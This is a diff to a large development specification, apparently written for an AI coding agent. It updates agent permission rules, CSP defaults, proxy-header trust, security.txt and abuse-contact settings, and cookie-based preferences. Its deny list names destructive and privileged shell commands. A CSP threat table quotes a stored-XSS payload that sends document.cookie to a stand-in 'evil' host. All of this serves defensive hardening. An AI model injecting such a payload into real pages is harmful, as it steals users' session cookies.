@@ -1731,31 +1731,30 @@ Both files use the same structure. Settings are merged: `settings.local.json` ov
       "Read(**)",
       "Write(**)",
       "Edit(**)",
-      "Bash(go:*)",
-      "Bash(make:*)",
-      "Bash(docker:*)",
-      "Bash(docker-compose:*)",
-      "Bash(git:*)",
-      "Bash(curl:*)",
-      "Bash(tree:*)",
-      "Bash(find:*)",
-      "Bash(grep:*)",
-      "Bash(rm:*)",
-      "Bash(mv:*)",
-      "Bash(cp:*)",
-      "Bash(mkdir:*)",
-      "Bash(chmod:*)",
-      "Bash(ln:*)",
-      "Bash(cat:*)",
-      "Bash(head:*)",
-      "Bash(tail:*)",
-      "Bash(ls:*)",
-      "Bash(pwd:*)",
-      "Bash(timeout:*)",
-      "Bash(sort:*)",
-      "Bash(wc:*)",
-      "Bash(diff:*)",
-      "Bash(:*::*)",
+      "Bash(go *)",
+      "Bash(make *)",
+      "Bash(docker *)",
+      "Bash(docker-compose *)",
+      "Bash(git *)",
+      "Bash(curl *)",
+      "Bash(tree *)",
+      "Bash(find *)",
+      "Bash(grep *)",
+      "Bash(rm *)",
+      "Bash(mv *)",
+      "Bash(cp *)",
+      "Bash(mkdir *)",
+      "Bash(chmod *)",
+      "Bash(ln *)",
+      "Bash(cat *)",
+      "Bash(head *)",
+      "Bash(tail *)",
+      "Bash(ls *)",
+      "Bash(pwd *)",
+      "Bash(timeout *)",
+      "Bash(sort *)",
+      "Bash(wc *)",
+      "Bash(diff *)",
       "WebSearch",
       "WebFetch(domain:github.com)",
       "WebFetch(domain:pkg.go.dev)",
@@ -1763,16 +1762,15 @@ Both files use the same structure. Settings are merged: `settings.local.json` ov
       "WebFetch(domain:golang.org)"
     ],
     "deny": [
-      "Bash(git commit:*)",
-      "Bash(git push:*)",
-      "Bash(git push:+)",
-      "Bash(rm -rf /*:*)",
-      "Bash(sudo:*)"
+      "Bash(git commit *)",
+      "Bash(git push *)",
+      "Bash(rm -rf *)",
+      "Bash(sudo *)"
     ],
     "ask": [
-      "Bash(git rebase:*)",
-      "Bash(git reset:*)",
-      "Bash(git checkout -- :*)"
+      "Bash(git rebase *)",
+      "Bash(git reset *)",
+      "Bash(git checkout -- *)"
     ]
   },
   "preferences": {
@@ -1813,10 +1811,8 @@ Both files use the same structure. Settings are merged: `settings.local.json` ov
 | `Read(**)` | Read any file | All files recursively |
 | `Write(**)` | Write any file | All files recursively |
 | `Edit(**)` | Edit any file | All files recursively |
-| `Bash(cmd:*)` | Command with zero or more args | `Bash(go:*)` → `go`, `go build`, `go test ./...` |
-| `Bash(cmd:+)` | Command with one or more args | `Bash(git push:+)` → `git push origin`, NOT bare `git push` |
-| `Bash(cmd arg:*)` | Command with specific prefix | `Bash(git commit:*)` → `git commit -m "msg"` |
-| `Bash(:*::*)` | Piped/chained commands | `cmd1 | cmd2`, `cmd1 && cmd2` |
+| `Bash(cmd *)` | Command with zero or more args | `Bash(go *)` → `go`, `go build`, `go test ./...` |
+| `Bash(cmd arg *)` | Command with specific prefix | `Bash(git commit *)` → `git commit -m "msg"` |
 | `WebFetch(domain:x)` | Fetch from specific domain | `WebFetch(domain:github.com)` |
 | `WebSearch` | Allow web searches | N/A |
 
@@ -1825,7 +1821,6 @@ Both files use the same structure. Settings are merged: `settings.local.json` ov
 | Wildcard | Meaning | Notes |
 |----------|---------|-------|
 | `*` | Zero or more of anything | Matches empty string too |
-| `+` | One or more of anything | Requires at least one character/arg |
 | `**` | Recursive glob | For file paths (all subdirectories) |
 
 **Permission Sections:**
@@ -1854,15 +1849,15 @@ Both files use the same structure. Settings are merged: `settings.local.json` ov
 
 | Project Type | Additional Allows | Additional Denies |
 |--------------|-------------------|-------------------|
-| Go project | `Bash(go:*)`, `Bash(golangci-lint:*)` | - |
-| Docker project | `Bash(docker:*)`, `Bash(docker-compose:*)` | `Bash(docker system prune:*)` |
-| Node project | `Bash(npm:*)`, `Bash(node:*)` | `Bash(npm publish:*)` |
-| Python project | `Bash(python:*)`, `Bash(pip:*)`, `Bash(uv:*)` | `Bash(pip install --user:*)` |
+| Go project | `Bash(go *)`, `Bash(golangci-lint *)` | - |
+| Docker project | `Bash(docker *)`, `Bash(docker-compose *)` | `Bash(docker system prune *)` |
+| Node project | `Bash(npm *)`, `Bash(node *)` | `Bash(npm publish *)` |
+| Python project | `Bash(python *)`, `Bash(pip *)`, `Bash(uv *)` | `Bash(pip install --user *)` |
 
 **CRITICAL Rules:**
-- NEVER allow `Bash(sudo:*)` - privilege escalation should be explicit and manual
-- NEVER allow `Bash(rm -rf /*:*)` or similar destructive patterns
-- ALWAYS deny `Bash(git commit:*)` and `Bash(git push:*)` - plain git commit/push are blocked because they bypass the signed-commit wrapper. AI commits via `gitcommit <command>` instead (see "gitcommit Script" rules)
+- NEVER allow `Bash(sudo *)` - privilege escalation should be explicit and manual
+- NEVER allow `Bash(rm -rf *)` or similar destructive patterns
+- ALWAYS deny `Bash(git commit *)` and `Bash(git push *)` - plain git commit/push are blocked because they bypass the signed-commit wrapper. AI commits via `gitcommit <command>` instead (see "gitcommit Script" rules)
 - Use `PreToolUse` hooks to enforce project standards (formatting, no vendor names)
 - The `env` section sets environment variables for ALL Bash commands in the session
 - Settings are merged: project settings extend/override global `~/.claude/settings.json`
@@ -2011,7 +2006,7 @@ Instructions for how this agent should behave...
   - the security reporting path — GitHub private vulnerability reporting (`https://github.com/{project_org}/{project_name}/security/advisories/new`, the repo's Security tab → "Report a vulnerability") is the PRIMARY channel; the security email is a secondary/CC contact only, never the main reporting path. On mirrors without private vulnerability reporting, point reporters at the GitHub origin repo first
   - that vulnerabilities are NOT filed as public bug reports
   - expected disclosure/response flow
-  - links to `/.well-known/security.txt` and `/server/contact?security_id=...` when those project features exist
+  - links to `/server/security`, `/.well-known/security.txt`, and `/server/contact?security_id=...` when those project features exist
 - `.github/CODEOWNERS` MUST define:
   - a catch-all owner for the repo
   - explicit owners for security-sensitive areas such as workflows, Docker/release files, and auth/crypto/update code paths
@@ -4101,8 +4096,8 @@ User preferences like theme, language, and UI settings can be stored client-side
 
 | Storage | Use Case | Persistence |
 |---------|----------|-------------|
-| `localStorage` | Theme, language, UI preferences | Until cleared |
-| Cookies | Session preferences, consent flags | Configurable expiry |
+| Cookies | Theme, language, UI preferences, consent flags | Configurable expiry; server-readable, so pages render correctly without JS |
+| `localStorage` | Client-only state the server never needs (e.g. draft form text) | Until cleared |
 
 These work for anonymous visitors and don't require user accounts. Server-side user preferences (stored in `user_preferences` table) require PART 34.
 
@@ -5164,15 +5159,16 @@ For code that runs in the application, NEVER use bare `/path`. Always use `{fqdn
 redirectURL := "/server/auth/callback"
 link := "/api/" + apiVersion + "/users/" + userID
 
-// ✅ CORRECT - Using FQDN
+// ❌ WRONG — hardcodes https; ignores reverse proxy headers; breaks behind a proxy
 redirectURL := fmt.Sprintf("https://%s/server/auth/callback", cfg.FQDN)
 link := fmt.Sprintf("https://%s/api/%s/users/%s", cfg.FQDN, apiVersion, userID)
 
-// ✅ CORRECT - Helper function
-func BuildURL(path string) string {
-    return fmt.Sprintf("https://%s%s", cfg.FQDN, path)
-}
-link := BuildURL("/api/" + apiVersion + "/users/" + userID)
+// ❌ WRONG — proxy-blind helper; physically cannot read X-Forwarded-* headers
+// See PART 12 → BuildURL / URL Variable Resolution for the full request-aware implementation.
+
+// ✅ CORRECT — request-aware; reverse-proxy headers first (PART 12 → "BuildURL")
+redirectURL := BuildURL(r, "/server/auth/callback")
+link := BuildURL(r, "/api/"+apiVersion+"/users/"+userID)
 ```
 
 **JavaScript examples:**
@@ -5194,8 +5190,11 @@ fetch(`${config.apiBaseUrl}/api/${apiVersion}/users`)
 <!-- ❌ WRONG - Bare path (breaks in emails, notifications) -->
 <a href="/verify?token={{.Token}}">Verify Email</a>
 
-<!-- ✅ CORRECT - Full URL using FQDN -->
+<!-- ❌ WRONG — hardcodes https; ignores proxy headers; breaks behind a proxy -->
 <a href="https://{{.FQDN}}/verify?token={{.Token}}">Verify Email</a>
+
+<!-- ✅ CORRECT — handler computes full URL via BuildURL(r, ...) and passes it to the template -->
+<a href="{{.VerifyURL}}">Verify Email</a>
 ```
 
 **Exception - Internal routing only:**
@@ -7766,7 +7765,7 @@ Self-Healing Successful?                        │
 ```json
 {
   "ok": false,
-  "error": "MAINTENANCE_MODE",
+  "error": "MAINTENANCE",
   "message": "Server is in maintenance mode due to: Database connection failed",
   "details": {
     "reason": "database_connection",
@@ -8190,7 +8189,7 @@ func (req *CreateResourceRequest) Parse() (*Resource, error) {
 
 **URL Variable Resolution (Reverse Proxy Preferred):**
 - `{fqdn}`: Reverse Proxy Headers → `DOMAIN` → `os.Hostname()` → `$HOSTNAME` → Global IP → `localhost`
-- `{proto}`: `X-Forwarded-Proto` → `X-Forwarded-Ssl` → TLS detection → `http`
+- `{proto}`: `X-Forwarded-Proto` → `X-Forwarded-Ssl` → `X-Url-Scheme` → TLS detection → `http`
 - `{port}`: `X-Forwarded-Port` → Host header → Server port → Proto default
 - `{baseurl}`: `X-Forwarded-Prefix` → `X-Forwarded-Path` → `X-Script-Name` → `server.baseurl` → `/`
 
@@ -13523,6 +13522,8 @@ func GetWildcardDomain() string
 | Email links | `BuildURL(r, "/verify")` |
 | CORS origins | Auto-include `GetWildcardDomain()` if detected |
 | OAuth callbacks | `BuildURL(r, "/server/auth/callback")` |
+| Generated well-known files (`/.well-known/security.txt`, `/.well-known/llms.txt`) | `BuildURL(r, "/path")` for every embedded URL — resolved per request, never frozen at startup |
+| `/server/security` page | `BuildURL(r, "/path")` for every rendered URL — must match the `security.txt` the same client fetches |
 
 ### FQDN Validation Rules
 
@@ -14908,8 +14909,8 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
     "line": 42,
     "column": 7,
     "sample": "doSomething(",
-    "matched_policy": "script-src 'self' 'unsafe-inline'",
-    "why_blocked": "inline event handler — 'unsafe-inline' applies only to <script> blocks, not on=\"...\" attributes",
+    "matched_policy": "script-src 'self'",
+    "why_blocked": "inline event handler — script-src 'self' allows no inline script of any kind (no 'unsafe-inline')",
     "fix_hint": "move the handler to an addEventListener() call in app.js"
   }
 }
@@ -14926,7 +14927,7 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
 | Threat | Layer 1 (input) | Layer 2 (data access) | Layer 3 (output) | Layer 4 (transport) |
 |--------|-----------------|------------------------|-------------------|----------------------|
 | SQL injection | Strict input validation by type/format | Parameterized queries ONLY — never `fmt.Sprintf` SQL with user input | ORM/query-builder layer rejects suspicious patterns | Database user has minimum privileges (no DROP, no DDL in app role) |
-| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP `'self' + 'unsafe-inline'` blocks cross-origin script loads (PART 11 → CSP) |
+| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP script-src `'self'` blocks injected scripts — inline and cross-origin (PART 11 → CSP) |
 | Enumeration (account existence, valid IDs, valid tokens) | Rate limit per IP + per identifier + global | Constant-time comparison for tokens / passwords | Identical response shape and timing for "not found" vs "no access" | n/a |
 | Timing oracles | n/a | `subtle.ConstantTimeCompare` for all secret comparisons | Identical response time for success/fail by adding artificial sleep when faster than threshold | n/a |
 | Credential stuffing | Rate limit per IP + per username + global | Argon2id on every login attempt (no "fast path" for unknown users) | Generic "invalid credentials" message | Account lockout after N failures |
@@ -15275,7 +15276,7 @@ web:
 | Header | Validated on | Reject if |
 |--------|--------------|-----------|
 | `Sec-Fetch-Site` | POST/PUT/PATCH/DELETE | `cross-site` AND no Bearer token AND path is not in CSRF `exempt_paths` |
-| `Sec-Fetch-Mode` | all | `navigate` on JSON API endpoints (`/api/*`) — indicates unintended top-level navigation |
+| `Sec-Fetch-Mode` | POST/PUT/PATCH/DELETE | `navigate` on JSON API endpoints (`/api/*`) — blocks form-based navigation CSRF. GET/HEAD navigation is ALLOWED: opening an API URL in a browser returns the JSON normally (GETs are side-effect-free and responses carry `nosniff`; matches the standard Fetch Metadata resource-isolation policy, which permits top-level GET navigations) |
 | `Sec-Fetch-Dest` | media/document endpoints | `iframe` for endpoints not in `frame-ancestors` allow-list |
 | `Sec-Fetch-User` | authenticated state-changers | absent on a navigation that should be user-initiated (sensitive admin flows only) |
 
@@ -15344,7 +15345,7 @@ Server-Timing: db;dur=12.4, render;dur=3.1, total;dur=18.7
 
 ```
 default-src 'self';
-script-src 'self' 'unsafe-inline';
+script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob: https:;
 font-src 'self' https:;
@@ -15367,7 +15368,7 @@ report-uri /api/{api_version}/server/reports/csp
 | Directive | Default | Reason |
 |-----------|---------|--------|
 | `default-src` | `'self'` | Strict baseline; all unset directives fall back here. |
-| `script-src` | `'self' 'unsafe-inline'` | `'unsafe-inline'` is the pragmatic compromise — most templates inline small scripts (analytics opt-in, theme bootstrap). Tighten with nonces if your app generates them; see "Tightening to nonce-based CSP" below. |
+| `script-src` | `'self'` | All JS lives in `static/js/app.js` — no inline scripts, no inline handlers — so `'self'` costs nothing and blocks every injected `<script>`, inline or cross-origin. |
 | `style-src` | `'self' 'unsafe-inline'` | Inline `style=""` attributes and `<style>` blocks are unavoidable in many templates and component frameworks. |
 | `img-src` | `'self' data: blob: https:` | `data:` for inline icons/SVG, `blob:` for client-side generated previews, `https:` so user avatars / CDN images / OG embeds work without per-host config. (HTTP images explicitly excluded — TLS only.) |
 | `font-src` | `'self' https:` | Web fonts (Google Fonts, FontAwesome CDN, custom CDNs) work without per-host config. HTTPS only. |
@@ -15447,7 +15448,7 @@ Server-side handling:
 
 ### Tightening to nonce-based CSP
 
-For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `script-src`/`style-src` and use:
+For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `style-src` too (`script-src` already ships without it) and use:
 
 ```yaml
 web:
@@ -15463,7 +15464,7 @@ The middleware substitutes `{request_nonce}` per response and adds the same nonc
 | Attack | Default policy stops it? |
 |--------|--------------------------|
 | Stored XSS injecting `<script src="https://evil.example/...">` | ✓ Yes (script-src `'self'` blocks the cross-origin load) |
-| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✗ No with default (`'unsafe-inline'`); ✓ Yes with nonce-based override |
+| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✓ Yes (script-src `'self'` has no `'unsafe-inline'` — all inline scripts are blocked) |
 | Clickjacking via `<iframe src="https://victim/...">` | ✓ Yes (frame-ancestors `'self'`) |
 | `<base href="https://evil/">` redirecting all relative URLs | ✓ Yes (base-uri `'self'`) |
 | Form-action hijack to `https://evil/login` | ✓ Yes (form-action `'self'`) |
@@ -15992,6 +15993,7 @@ web:
 Contact: {report_url}
 Contact: https://{fqdn}/server/contact?security_id={security_id}
 Contact: mailto:{security_contact}
+Policy: https://{fqdn}/server/security
 Expires: {expiry_date}
 ```
 
@@ -16030,6 +16032,9 @@ web:
 |-------|----------|-------------|
 | `Contact` | YES | One or more lines in order of preference (RFC 9116): first the repo's GitHub private vulnerability reporting URL (`web.security.report_url`), then the instance security-report form (`/server/contact?security_id={id}`, auto-generated — see "Security Reports"), last the `mailto:` CC address (prefix added automatically) |
 | `Expires` | YES | Expiration date (auto-renewed yearly by default) |
+| `Policy` | YES | Human-readable security page at `/server/security` — renders the same information as this file plus plain-language reporting instructions. See "Security Reports" → "Public Pages". |
+
+**URL resolution:** every `{proto}`/`{fqdn}` in this file — and in the generated `llms.txt` and the `/server/security` page — is resolved **per request** via `BuildURL(r, ...)` (PART 12 → "Resolution Order": reverse-proxy headers first, gated by `trusted_proxies`). Never build these URLs from values cached at startup: the URLs a client sees MUST match the Host/proto that client actually used, so `security.txt`, `/server/security`, and every other rendered URL can never disagree behind a reverse proxy.
 
 ### llms.txt (AI Discovery)
 
@@ -16196,6 +16201,7 @@ Repo-level (source-code) vulnerabilities are reported primarily via GitHub priva
 |----------|--------|------|---------|
 | `/.well-known/security.txt` | GET | None | RFC 9116 file — see above |
 | `/.well-known/pgp-key.asc` | GET | None | Project's PGP public key (ASCII-armored). 404 if no keypair generated yet. |
+| `/server/security` | GET | None | Security overview page (HTML). Human-readable rendering of everything in `/.well-known/security.txt` — contact channels in RFC 9116 preference order (GitHub private vulnerability reporting, `/server/contact?security_id={id}`, `mailto:` CC address), `Expires`, and the `Encryption` key when a keypair exists — plus plain-language instructions for reporting a vulnerability. Links to `/server/security/policy`, `/server/security/thanks`, `/.well-known/pgp-key.asc`, and the machine-readable `/.well-known/security.txt`. Rendered from live config — nothing to edit. |
 | `/server/security/policy` | GET | None | Disclosure policy page (HTML). Default content provided; editable from admin panel. Lists the coordinated-disclosure window, in-scope domains, out-of-scope behaviors, safe-harbor language. |
 | `/server/security/thanks` | GET | None | Acknowledgments page. Lists researchers who opted in (real name, handle, or anonymized "Anonymous Researcher #n") with the year and short credit. |
 | `/server/security/report/{tracking_id}` | GET | One-shot token in URL | Researcher status page — shows triage state (Received / Triaged / Confirmed / Patching / Disclosed / Won't Fix), maintainer comments visible to researcher, expected disclosure date. Token is single-use-per-day; expires after the report is closed for 30 days. |
@@ -17959,7 +17965,17 @@ server:
     additional: []
 ```
 
-**Used by `X-Forwarded-*` trust gate.** Every header-based detection chain in the spec — `BuildURL(r, ...)` (PART 12 → "Resolution Order"), CORS allow-list resolution (PART 16), CSP `connect-src` learning, domain-learning algorithm — only honors `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Real-IP`, `X-Original-Host` when the **immediate peer's IP** is in `trusted_proxies` (private ranges + the `additional` allow-list). Headers from non-trusted peers are dropped before resolution runs, so an attacker reaching the binary directly cannot inject a forged Host into the learned-origins list.
+**Used by `X-Forwarded-*` trust gate.** Every header-based detection chain in the spec — `BuildURL(r, ...)` (PART 12 → "Resolution Order"), CORS allow-list resolution (PART 16), CSP `connect-src` learning, domain-learning algorithm — only honors the following proxy headers when the **immediate peer's IP** is in `trusted_proxies` (private ranges + the `additional` allow-list):
+
+| Category | Trusted headers |
+|----------|----------------|
+| **FQDN** | `X-Forwarded-Host`, `X-Real-Host`, `X-Original-Host` |
+| **Proto** | `X-Forwarded-Proto`, `X-Forwarded-Ssl`, `X-Url-Scheme` |
+| **Port** | `X-Forwarded-Port` |
+| **Base path** | `X-Forwarded-Prefix`, `X-Forwarded-Path`, `X-Script-Name` |
+| **Client IP** | `X-Real-IP`, `X-Forwarded-For`, `CF-Connecting-IP`, `True-Client-IP`, `X-Client-IP` |
+
+All of these headers are supported regardless of proxy vendor (Nginx, Caddy, HAProxy, Traefik, Apache, Cloudflare Tunnels, AWS ALB, etc.). Headers from non-trusted peers are dropped before resolution runs, so an attacker reaching the binary directly cannot inject a forged Host into the learned-origins list.
 
 | Always trusted (no config required) | Reason |
 |--------------------------------------|--------|
@@ -18084,7 +18100,7 @@ server:
 
 ## Contact Configuration (Server Notification Recipients)
 
-**One unified config tree for every "where do messages go" decision the server makes — admin notifications, security reports, contact-form submissions. Each role supports email AND any number of webhook transports (Telegram, Discord, Slack, generic). Empty role-specific email falls back to the admin address. There is one knob to set (`server.contact.admin.email`); everything else is optional.**
+**One unified config tree for every "where do messages go" decision the server makes — admin notifications, security reports, abuse reports, contact-form submissions. Each role supports email AND any number of webhook transports (Telegram, Discord, Slack, generic). Empty role-specific email falls back to the admin address. There is one knob to set (`server.contact.admin.email`); everything else is optional.**
 
 ### Schema
 
@@ -18128,6 +18144,26 @@ server:
         slack: ""
         generic: ""
 
+    # ---- Abuse (abusive content / policy violations) ----
+    # Recipient for abuse reports: spam, harassment, illegal or abusive
+    # content, terms-of-service violations. Public surface — shown in the
+    # contact page's "Abuse Reports" section when set. RFC 2142 defines
+    # abuse@ as the standard role mailbox; operators SHOULD set this to
+    # "abuse@{fqdn}". Default is "" (unlike security@, the server never
+    # auto-advertises abuse@{fqdn} — an unprovisioned mailbox would
+    # bounce reports). If empty: delivery falls back to
+    # server.contact.general.email, then server.contact.admin.email
+    # (same chain for webhooks); the contact page then shows
+    # general.email if set, otherwise the form alone.
+    abuse:
+      # RFC 2142 standard role mailbox is abuse@{fqdn} — opt in explicitly
+      email: ""
+      webhooks:
+        telegram: ""
+        discord: ""
+        slack: ""
+        generic: ""
+
     # ---- General (public contact form) ----
     # Recipient for /server/contact submissions (non-security). Public
     # surface — appears as the "Contact us" email if the contact page
@@ -18149,6 +18185,7 @@ server:
 |------|------------|
 | `admin` | Required. Empty → startup warning. The very first server admin's profile email is auto-populated here on first install if unset. |
 | `security` | `server.contact.security.email` (default `security@{fqdn}` per RFC 2142). If explicitly set to `""`, falls back to `server.contact.admin.email`. Same fallback for each webhook transport (security.webhooks.telegram → admin.webhooks.telegram). |
+| `abuse` | `server.contact.abuse.email` if set → else `server.contact.general.email` if set → else `server.contact.admin.email`. Same fallback chain for webhooks. Never defaults to `abuse@{fqdn}` automatically — RFC 2142 recommends that address, but the operator must opt in (an unprovisioned mailbox would bounce reports). |
 | `general` | `server.contact.general.email` if set → else `server.contact.admin.email`. Same fallback for webhooks. |
 
 **Effective recipient is computed once per dispatch, not cached across requests** — operator can change `general.email` and the next contact-form submission picks it up without restart.
@@ -18202,6 +18239,7 @@ if !subtle.ConstantTimeCompare([]byte(got), []byte(want)) {
 |------|----------------|--------------|
 | `admin` | Server-internal events: error rate spike, panic, cluster failover, backup failure, cert renewal, security report received (summary only) | Subject + body + severity + a deep-link to `/server/{admin_path}/config/...`. NEVER includes user content. |
 | `security` | Incoming security report (full content, encrypted), researcher status update, CVE assignment milestone | PGP-encrypted body if a researcher pubkey or admin pubkey is configured (PART 11 → "GPG Keypair Management"). |
+| `abuse` | Application-defined abuse events (user-flagged content, DMCA/takedown requests) and any `/server/contact` submission the application routes as an abuse report | Sender name, sender email, subject, message body, and the reported resource URL when the application provides one. Spam-filtered before dispatch. |
 | `general` | `/server/contact` form submission (non-security) | Sender name, sender email, subject, message body. Spam-filtered before dispatch. |
 
 ### Privacy & Public Exposure
@@ -18210,6 +18248,7 @@ if !subtle.ConstantTimeCompare([]byte(got), []byte(want)) {
 |-------|------------------|-------|
 | `server.contact.admin.email` | NEVER public | Server-internal recipient only. |
 | `server.contact.security.email` | Public (security.txt `Contact: mailto:` line — the secondary/CC channel; GitHub private vulnerability reporting is primary) | Researchers need to reach you. Choose carefully. Suggest a role address (`security@{fqdn}`) over a personal one. |
+| `server.contact.abuse.email` | Public (contact page "Abuse Reports" section) when set | RFC 2142 role address (`abuse@{fqdn}`) recommended over a personal one. |
 | `server.contact.general.email` | Public (contact form, footer "Contact us") | Same — role address recommended. |
 | Any `webhooks.*` | NEVER public | URLs contain bearer tokens / chat IDs / etc. |
 
@@ -18219,13 +18258,14 @@ Use only the canonical contact keys in all new config, examples, docs, UI, and c
 
 - `server.contact.admin.email`
 - `server.contact.security.email`
+- `server.contact.abuse.email`
 - `server.contact.general.email`
 
 Do NOT introduce flat aliases, duplicate names, or migration shims for contact recipients unless the user explicitly requests a migration feature.
 
 ### Admin Panel — `/server/{admin_path}/config/notify`
 
-Single page with three tabs (Admin / Security / General). Each tab shows email + webhooks for that role with "test" buttons that send a sample notification through every configured transport.
+Single page with four tabs (Admin / Security / Abuse / General). Each tab shows email + webhooks for that role with "test" buttons that send a sample notification through every configured transport.
 
 ## Analytics Tracking
 
@@ -18970,8 +19010,9 @@ type ConsentState struct {
     Timestamp   int64 `json:"timestamp"`
 }
 
-// Stored in localStorage as JSON:
-// cookieConsent = {"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}
+// Stored in the cookie_consent COOKIE as JSON so the server (ConsentMiddleware,
+// getConsentFromRequest) can read it - never localStorage, which the server cannot see:
+// cookie_consent = {"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}
 ```
 
 ### Granular Consent UI (Manage Preferences)
@@ -21346,15 +21387,14 @@ See the **"Themes (NON-NEGOTIABLE - PROJECT-WIDE)"** section for the complete th
 **Theme Implementation Requirements:**
 
 1. **Theme Detection:**
-   - Check `localStorage` or cookie for user preference
-   - Fall back to `prefers-color-scheme` media query if auto mode
+   - Read the `theme` cookie server-side (logged-in users: per-user preference from the DB) and render the theme class on the root element
+   - `auto` mode is pure CSS via the `prefers-color-scheme` media query - no JS detection needed
    - Default to dark if no preference set
 
 2. **Theme Switching:**
-   - Provide theme toggle in UI (light/dark/auto)
-   - Store preference in `localStorage` or cookie
+   - Provide theme toggle in UI (light/dark/auto) as a small POST form that sets the `theme` cookie server-side - works without JS
+   - External JS enhancement intercepts the toggle to apply the theme class without a page reload
    - Apply theme class to root element (`theme-light`, `theme-dark`)
-   - NO page reload required
 
 3. **Accessibility:**
    - Both themes MUST pass WCAG AA contrast requirements
@@ -23940,14 +23980,19 @@ html.theme-light {
 | Download | Downloading... |
 
 ```html
-<!-- Submit button with loading state -->
-<button type="submit" id="save-btn" onclick="this.disabled=true; this.textContent='Saving...';">
+<!-- Submit button with loading state (no inline handler - CSP blocks on* attributes) -->
+<button type="submit" id="save-btn">
   Save
 </button>
 ```
 
 ```javascript
-// Re-enable after response
+// External JS (app.js): disable on submit, re-enable after response
+const btn = document.getElementById('save-btn');
+btn.form.addEventListener('submit', () => {
+  btn.disabled = true;
+  btn.textContent = 'Saving...';
+});
 fetch('/api/save', { method: 'POST', body: data })
   .then(response => { /* handle success */ })
   .catch(error => { /* handle error */ })
@@ -24002,21 +24047,21 @@ fetch('/api/save', { method: 'POST', body: data })
 | **Screen reader** | Announce modal title on open |
 
 ```html
-<!-- Modal structure using native <dialog> -->
+<!-- Modal structure using native <dialog> - no JS needed to close -->
 <dialog id="confirm-modal" aria-labelledby="modal-title">
   <header>
     <h2 id="modal-title">Modal Title</h2>
-    <button type="button" aria-label="Close" onclick="this.closest('dialog').close()">✕</button>
+    <form method="dialog"><button aria-label="Close">✕</button></form>
   </header>
   <main>Modal content here</main>
   <footer>
-    <button type="button" onclick="this.closest('dialog').close()">Cancel</button>
+    <form method="dialog"><button>Cancel</button></form>
     <button type="submit" autofocus>Confirm</button>
   </footer>
 </dialog>
 ```
 
-**Note:** Native `<dialog>` element handles focus trap and backdrop automatically. Use `showModal()` to open with backdrop, `close()` to close.
+**Note:** Native `<dialog>` element handles focus trap, Escape key, and backdrop automatically. `<form method="dialog">` closes the dialog with zero JavaScript - never use inline `onclick` handlers (blocked by CSP). Use `showModal()` (external JS) to open with backdrop.
 
 ### Toast vs Modal: When to Use Which
 
@@ -24205,6 +24250,11 @@ function changePassword() {
 
 @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } }
 @keyframes countdown { from { width: 100%; } to { width: 0%; } }
+
+/* Pause on hover is pure CSS - pause the countdown animation, no JS timers */
+.toast:hover .toast-progress {
+  animation-play-state: paused;
+}
 ```
 
 **JavaScript Toast API:**
@@ -24225,6 +24275,10 @@ dismissToast(toastId);
 // Dismiss all
 dismissAllToasts();
 ```
+
+**Server-Rendered Flash Messages (no-JS fallback):**
+
+Toasts require JavaScript. For standard (non-AJAX) form POSTs, the server MUST use the POST-redirect-GET pattern with a one-shot flash message (stored in the session or a short-lived cookie, cleared after render) and display it as a static dismissible alert at the top of the next page. Toasts are the JS enhancement layered on top of this - never the only feedback channel.
 
 ### Notification Bell
 
@@ -24463,9 +24517,11 @@ dismissAllToasts();
 
 **All forms MUST provide clear, inline validation feedback.**
 
+**Layering:** HTML5 constraint attributes first (`required`, `pattern`, `type=`, `minlength`, `min`/`max`) - they validate with zero JS. CSS `:user-invalid` styles invalid fields only after the user has interacted (same effect as a blur handler, no JS). External JS only mirrors the field's `validationMessage` into the inline error span. Server-side validation remains authoritative and re-renders errors for no-JS submits.
+
 | Rule | Implementation |
 |------|----------------|
-| **Validate on blur** | Show error when user leaves field (not while typing) |
+| **Validate on blur** | CSS `:user-invalid` shows the error state after the user leaves the field (not while typing) - no blur-handler JS needed for styling |
 | **Inline errors** | Error message directly below the field, not in alert/modal |
 | **Highlight field** | Red border on invalid fields, green on valid (optional) |
 | **Clear on fix** | Remove error immediately when user corrects input |
@@ -24509,6 +24565,10 @@ dismissAllToasts();
 
 **CSS for Validation States:**
 ```css
+/* Native validation styling - fires only after user interaction, no JS required */
+input:user-invalid,
+select:user-invalid,
+textarea:user-invalid,
 .form-group.error input,
 .form-group.error select,
 .form-group.error textarea {
@@ -24744,11 +24804,15 @@ setInterval(() => {
 function showUpdateNotification() {
   const banner = document.createElement('div');
   banner.className = 'update-banner';
-  banner.innerHTML = `
-    <span>A new version is available</span>
-    <button onclick="updateApp()">Update Now</button>
-    <button onclick="this.parentElement.remove()">Later</button>
-  `;
+  const label = document.createElement('span');
+  label.textContent = 'A new version is available';
+  const updateBtn = document.createElement('button');
+  updateBtn.textContent = 'Update Now';
+  updateBtn.addEventListener('click', updateApp);
+  const laterBtn = document.createElement('button');
+  laterBtn.textContent = 'Later';
+  laterBtn.addEventListener('click', () => banner.remove());
+  banner.append(label, updateBtn, laterBtn);
   document.body.appendChild(banner);
 }
 
@@ -25866,7 +25930,7 @@ Quick reference: Default allows all origins (`*`). Configure via `web.cors` in s
 | Collapsible sections | `<details>/<summary>` | Need animation or programmatic control |
 | Tabs | CSS `:target` or radio button hack | Need deep linking or state management |
 | Tooltips | CSS `::after` with `data-tooltip` | Need dynamic positioning |
-| Modals | CSS `:target` selector | Need focus trap, escape key, backdrop click |
+| Modals | Native `<dialog>` + `<form method="dialog">` - focus trap, Escape key, and `::backdrop` are built in | Opening with backdrop needs a `showModal()` call (external JS) |
 | Hover effects | CSS `:hover`, `:focus`, `:active` | Never - always CSS |
 | Animations | CSS `@keyframes`, `transition` | Complex sequenced animations |
